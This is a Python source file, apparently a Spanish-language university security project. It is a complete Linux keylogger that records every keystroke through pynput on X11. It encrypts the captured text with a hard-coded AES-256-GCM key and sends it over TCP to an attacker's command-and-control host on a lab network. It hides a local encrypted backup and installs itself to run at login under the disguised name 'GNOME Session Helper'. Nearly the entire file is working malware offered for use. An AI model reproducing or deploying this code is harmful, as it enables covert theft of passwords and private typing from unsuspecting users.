"""
keylogger.py
============
Proyecto Unidad 2 - Seguridad Informática
Plataforma objetivo: Ubuntu 24.04 LTS (Linux, x86_64)

Descripción general
-------------------
Keylogger para Linux desarrollado en Python. Captura cada tecla pulsada
mediante pynput (backend X11/XOrg), agrupa el texto en chunks, los cifra
con AES-256-GCM y los envía periódicamente al servidor C2 del atacante
vía TCP. Implementa persistencia sin privilegios de root usando el
mecanismo XDG Autostart (.desktop file en ~/.config/autostart/).

Requisitos en la máquina víctima (Ubuntu 24.04)
------------------------------------------------
  - Sesión gráfica X11 (no Wayland) — ver README para configurarlo
  - Python 3.10+ (incluido por defecto en Ubuntu 24.04)
  - pip install pynput cryptography

Flujo de ejecución
------------------
1. install_persistence()  -> crea ~/.config/autostart/wsh.desktop
2. _listener_thread()     -> pynput escucha cada KeyPress vía X11
3. _sender_thread()       -> cada SEND_INTERVAL segundos cifra y envía por TCP
4. KeyboardInterrupt      -> apaga los hilos limpiamente

Dependencias (ver requirements.txt)
-------------------------------------
  pynput>=1.7
  cryptography>=41
"""

import os
import sys
import time
import socket
import struct
import threading
import logging

from pynput import keyboard
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


# ──────────────────────────────────────────────────────────────────────────────
# CONFIGURACIÓN
# ──────────────────────────────────────────────────────────────────────────────

# IP del servidor C2 (máquina Parrot del atacante)
# Cambiar por la IP real de la VM Parrot antes de compilar
C2_HOST: str = "10.0.4.4"        # IP de la VM Parrot (atacante) en Red NAT
C2_PORT: int = 4444

# Intervalo de envío en segundos (configurable)
SEND_INTERVAL: int = 30

# Clave AES-256 (32 bytes embebidos en el ejecutable).
# Implicancias de seguridad: al estar embebida, un análisis estático del
# binario con herramientas como 'strings' o Ghidra podría exponer la clave.
# Alternativa más segura: generar dinámicamente con ECDH/RSA, embeber
# solo la clave pública del servidor.
AES_KEY: bytes = bytes([
    0x3A, 0xF1, 0x7C, 0x9E, 0x42, 0xBD, 0x05, 0x6F,
    0xC8, 0x21, 0xEA, 0x3D, 0x90, 0x54, 0x18, 0xAB,
    0x77, 0xCC, 0xFE, 0x0B, 0x2E, 0x61, 0xD4, 0x83,
    0x5B, 0x96, 0x1A, 0xE7, 0x0F, 0x48, 0xD9, 0x22,
])

# Nombre camuflado del proceso y del .desktop de autostart
APP_NAME: str    = "gnome-session-helper"
APP_DISPLAY: str = "GNOME Session Helper"

# Directorio y archivo de backup local (cifrado) cuando el C2 no está disponible
HOME_DIR: str  = os.path.expanduser("~")
LOG_DIR: str   = os.path.join(HOME_DIR, ".local", "share", ".cache_sys")
LOG_FILE: str  = os.path.join(LOG_DIR, "session.enc")

# Ruta del ejecutable compilado en la máquina víctima (ajustar tras compilar)
EXEC_PATH: str = os.path.join(HOME_DIR, ".local", "bin", "wsh")


# ──────────────────────────────────────────────────────────────────────────────
# ESTADO GLOBAL
# ──────────────────────────────────────────────────────────────────────────────

_buffer_lock  = threading.Lock()
_key_buffer: list[str] = []
_stop_event   = threading.Event()

logging.basicConfig(
    level=logging.DEBUG,
    format="[%(asctime)s] %(levelname)s  %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("keylogger")


# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO: CIFRADO  (AES-256-GCM)
# ──────────────────────────────────────────────────────────────────────────────

def encrypt_payload(plaintext: bytes, key: bytes) -> bytes:
    """
    Cifra `plaintext` con AES-256-GCM (cifrado autenticado AEAD).

    Parámetros
    ----------
    plaintext : bytes
        Datos en claro a cifrar (teclas capturadas en UTF-8).
    key : bytes
        Clave AES de 32 bytes (256 bits).

    Retorno
    -------
    bytes
        nonce (12 bytes) || ciphertext+tag (variable).
        El nonce aleatorio se antepone para que el receptor pueda
        descifrar sin información fuera de banda adicional.

    Distinción hash vs cifrado
    --------------------------
    * MD5 / SHA-256 son funciones de HASH: unidireccionales, no reversibles.
      No cifran: no se puede recuperar el original. MD5 además está roto
      criptográficamente (colisiones conocidas) y NO es válido para cifrado.
    * AES-256-GCM es un algoritmo de cifrado SIMÉTRICO autenticado (AEAD):
      garantiza confidencialidad + integridad en una sola operación.
      El nonce de 96 bits (12 bytes) se genera aleatoriamente en cada
      llamada y jamás debe repetirse con la misma clave.
    """
    aesgcm    = AESGCM(key)
    nonce     = os.urandom(12)                        # nonce aleatorio 96 bits
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return nonce + ciphertext                         # payload = nonce || ct+tag


def decrypt_payload(payload: bytes, key: bytes) -> bytes:
    """
    Descifra y verifica la autenticidad de `payload`.

    Parámetros
    ----------
    payload : bytes
        Datos producidos por encrypt_payload (nonce || ciphertext+tag).
    key : bytes
        Misma clave AES de 32 bytes usada al cifrar.

    Retorno
    -------
    bytes
        Plaintext original.

    Lanza
    -----
    cryptography.exceptions.InvalidTag
        Si el mensaje fue alterado en tránsito (detección de manipulación MITM).
    """
    nonce      = payload[:12]
    ciphertext = payload[12:]
    aesgcm     = AESGCM(key)
    return aesgcm.decrypt(nonce, ciphertext, None)


# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO: PERSISTENCIA  (XDG Autostart — sin privilegios root)
# ──────────────────────────────────────────────────────────────────────────────

def install_persistence() -> None:
    """
    Instala persistencia sin privilegios de root usando el estándar
    XDG Autostart: crea un archivo .desktop en ~/.config/autostart/.

    Mecanismo de persistencia en Ubuntu 24.04
    ------------------------------------------
    El entorno de escritorio GNOME (y cualquier DE compatible con
    freedesktop.org) lee los archivos .desktop en ~/.config/autostart/
    al inicio de sesión del usuario y ejecuta los programas listados.
    No requiere permisos de administrador (opera a nivel de usuario,
    equivalente a HKCU en Windows).

    El ejecutable se copia primero a ~/.local/bin/wsh (directorio de
    binarios de usuario) para garantizar que la ruta sea estable
    independientemente de desde dónde se ejecutó por primera vez.

    Parámetros
    ----------
    (ninguno)

    Efectos secundarios
    -------------------
    - Crea ~/.local/bin/ si no existe y copia el ejecutable actual.
    - Crea ~/.config/autostart/gnome-session-helper.desktop.
    """
    # 1. Copiar el ejecutable a una ruta estable
    bin_dir = os.path.join(HOME_DIR, ".local", "bin")
    os.makedirs(bin_dir, exist_ok=True)

    current_exec = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
    stable_path  = os.path.join(bin_dir, "wsh")

    if current_exec != stable_path:
        try:
            import shutil
            shutil.copy2(current_exec, stable_path)
            os.chmod(stable_path, 0o755)
            log.info("Ejecutable copiado a %s", stable_path)
        except OSError as exc:
            log.warning("No se pudo copiar el ejecutable: %s", exc)
            stable_path = current_exec   # usar la ruta actual como fallback

    # 2. Crear el archivo .desktop en ~/.config/autostart/
    autostart_dir = os.path.join(HOME_DIR, ".config", "autostart")
    os.makedirs(autostart_dir, exist_ok=True)

    desktop_path = os.path.join(autostart_dir, f"{APP_NAME}.desktop")
    desktop_content = (
        "[Desktop Entry]\n"
        "Type=Application\n"
        f"Name={APP_DISPLAY}\n"
        f"Exec={stable_path}\n"
        "Hidden=false\n"
        "NoDisplay=true\n"
        "X-GNOME-Autostart-enabled=true\n"
        "X-GNOME-Autostart-Delay=5\n"
        "Comment=System session management helper\n"
    )

    try:
        with open(desktop_path, "w") as f:
            f.write(desktop_content)
        log.info("Persistencia instalada: %s", desktop_path)
    except OSError as exc:
        log.warning("No se pudo crear .desktop: %s", exc)


def remove_persistence() -> None:
    """
    Elimina el archivo .desktop de autostart creado por install_persistence().
    Útil para limpiar el entorno de prueba tras la demostración.
    """
    desktop_path = os.path.join(
        HOME_DIR, ".config", "autostart", f"{APP_NAME}.desktop"
    )
    try:
        os.remove(desktop_path)
        log.info("Persistencia eliminada: %s", desktop_path)
    except FileNotFoundError:
        log.debug("Archivo .desktop no encontrado (ya eliminado).")
    except OSError as exc:
        log.warning("Error eliminando persistencia: %s", exc)


# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO: CAPTURA DE TECLADO  (pynput + X11)
# ──────────────────────────────────────────────────────────────────────────────

def _on_press(key) -> None:
    """
    Callback de pynput invocado en cada pulsación de tecla (backend X11).

    Parámetros
    ----------
    key : pynput.keyboard.Key | pynput.keyboard.KeyCode
        Objeto que representa la tecla pulsada.

    Comportamiento
    --------------
    * Teclas de carácter (a-z, 0-9, símbolos): se convierte a str.
    * Teclas especiales (Enter, Backspace, Tab…): se representa como
      etiqueta entre corchetes, p.ej. [Enter], [Backspace].
    * Todas las pulsaciones se añaden al buffer protegido por _buffer_lock.

    Limitaciones conocidas en Ubuntu 24.04
    ----------------------------------------
    * Solo funciona en sesiones X11 (no Wayland). En Wayland, pynput
      requiere permisos adicionales (evdev) o falla silenciosamente.
    * Campos de contraseña en gestores de contraseñas con SecureInput
      activo no son accesibles por la API de X11.
    * Combinaciones capturadas por el kernel antes de llegar a X11
      (p.ej. Ctrl+Alt+Del, Super+L) no son interceptadas.
    * Texto generado por métodos de entrada de terceros (IBus, Fcitx)
      puede no capturarse correctamente en algunas configuraciones.
    * Texto pegado con el ratón (portapapeles) no se registra sin un
      módulo específico de clipboard.
    """
    with _buffer_lock:
        try:
            _key_buffer.append(key.char)
        except AttributeError:
            special_map = {
                keyboard.Key.space:     " ",
                keyboard.Key.enter:     "[Enter]\n",
                keyboard.Key.backspace: "[Backspace]",
                keyboard.Key.tab:       "[Tab]",
                keyboard.Key.shift:     "[Shift]",
                keyboard.Key.shift_r:   "[Shift]",
                keyboard.Key.ctrl_l:    "[Ctrl]",
                keyboard.Key.ctrl_r:    "[Ctrl]",
                keyboard.Key.alt_l:     "[Alt]",
                keyboard.Key.alt_r:     "[AltGr]",
                keyboard.Key.caps_lock: "[CapsLock]",
                keyboard.Key.esc:       "[Esc]",
                keyboard.Key.delete:    "[Del]",
                keyboard.Key.home:      "[Home]",
                keyboard.Key.end:       "[End]",
                keyboard.Key.up:        "[Arriba]",
                keyboard.Key.down:      "[Abajo]",
                keyboard.Key.left:      "[Izq]",
                keyboard.Key.right:     "[Der]",
                keyboard.Key.cmd:       "[Super]",
            }
            label = special_map.get(key, f"[{key.name}]")
            _key_buffer.append(label)


def _listener_thread() -> None:
    """
    Hilo que mantiene activo el listener de pynput.

    Arranca keyboard.Listener con on_press=_on_press y espera a que
    _stop_event sea señalado antes de detener el listener.

    En Ubuntu 24.04 con X11, pynput usa la biblioteca python-xlib para
    hacer hooking global del teclado. No requiere privilegios root.
    """
    log.info("Listener de teclado iniciado (backend X11).")
    with keyboard.Listener(on_press=_on_press) as listener:
        _stop_event.wait()
        listener.stop()
    log.info("Listener de teclado detenido.")


# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO: TRANSMISIÓN TCP
# ──────────────────────────────────────────────────────────────────────────────

def _send_chunk(data: bytes) -> bool:
    """
    Envía un chunk cifrado al servidor C2 mediante TCP.

    Protocolo de aplicación
    ------------------------
    Cliente -> Servidor:
      [4 bytes big-endian = longitud del payload]
      [payload: nonce(12) + ciphertext + tag(16)]
    Servidor -> Cliente:
      [4 bytes ACK = 0x00 0xAC 0x00 0x4B]

    Parámetros
    ----------
    data : bytes
        Payload ya cifrado (nonce + ciphertext + tag GCM).

    Retorno
    -------
    bool
        True si el servidor confirmó la recepción con ACK; False si error.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            s.connect((C2_HOST, C2_PORT))
            header = struct.pack(">I", len(data))
            s.sendall(header + data)
            ack = s.recv(4)
            return ack == b"\x00\xAC\x00\x4B"
    except (ConnectionRefusedError, socket.timeout, OSError) as exc:
        log.warning("Error enviando chunk al C2: %s", exc)
        return False


def _save_backup(encrypted: bytes) -> None:
    """
    Guarda el chunk cifrado localmente si el C2 no está disponible.

    Formato: secuencia de [4 bytes big-endian longitud] + [payload cifrado].
    Ubicación: ~/.local/share/.cache_sys/session.enc

    Parámetros
    ----------
    encrypted : bytes
        Payload cifrado (nonce + ciphertext + tag).
    """
    os.makedirs(LOG_DIR, exist_ok=True)
    with open(LOG_FILE, "ab") as f:
        header = struct.pack(">I", len(encrypted))
        f.write(header + encrypted)
    log.debug("Backup guardado en %s (%d bytes)", LOG_FILE, len(encrypted))


def _sender_thread() -> None:
    """
    Hilo que cada SEND_INTERVAL segundos vacía el buffer, cifra el contenido
    y lo envía al C2. Si el envío falla, guarda el chunk cifrado localmente.

    Flujo por iteración
    -------------------
    1. Esperar SEND_INTERVAL segundos (o hasta _stop_event).
    2. Tomar y limpiar _key_buffer bajo _buffer_lock.
    3. Cifrar con encrypt_payload().
    4. Intentar _send_chunk(); si falla -> _save_backup().
    """
    log.info("Hilo sender iniciado. Intervalo: %ds -> %s:%d",
             SEND_INTERVAL, C2_HOST, C2_PORT)

    while not _stop_event.wait(timeout=SEND_INTERVAL):
        with _buffer_lock:
            if not _key_buffer:
                continue
            chunk_text = "".join(_key_buffer)
            _key_buffer.clear()

        preview = chunk_text[:50] + ("…" if len(chunk_text) > 50 else "")
        log.debug("Capturado (%d chars): %r", len(chunk_text), preview)

        plaintext = chunk_text.encode("utf-8")
        encrypted = encrypt_payload(plaintext, AES_KEY)

        if _send_chunk(encrypted):
            log.info("Chunk enviado al C2 (%d bytes cifrados).", len(encrypted))
        else:
            _save_backup(encrypted)
            log.warning("C2 no disponible. Chunk guardado en backup local.")

    log.info("Hilo sender detenido.")


# ──────────────────────────────────────────────────────────────────────────────
# PUNTO DE ENTRADA
# ──────────────────────────────────────────────────────────────────────────────

def main() -> None:
    """
    Función principal del keylogger.

    Orquesta el ciclo de vida completo:
      1. Instala la persistencia XDG Autostart.
      2. Arranca el hilo listener (captura de teclado X11).
      3. Arranca el hilo sender (cifrado y envío periódico).
      4. El hilo principal espera indefinidamente hasta Ctrl+C.
    """
    log.info("=== KeyLogger iniciado (Ubuntu 24.04 / X11) ===")
    install_persistence()

    t_listener = threading.Thread(
        target=_listener_thread, daemon=True, name="kl-listener"
    )
    t_sender = threading.Thread(
        target=_sender_thread, daemon=True, name="kl-sender"
    )

    t_listener.start()
    t_sender.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log.info("Interrupción recibida. Apagando...")
        _stop_event.set()

    t_listener.join(timeout=5)
    t_sender.join(timeout=5)
    log.info("=== KeyLogger detenido ===")


if __name__ == "__main__":
    main()
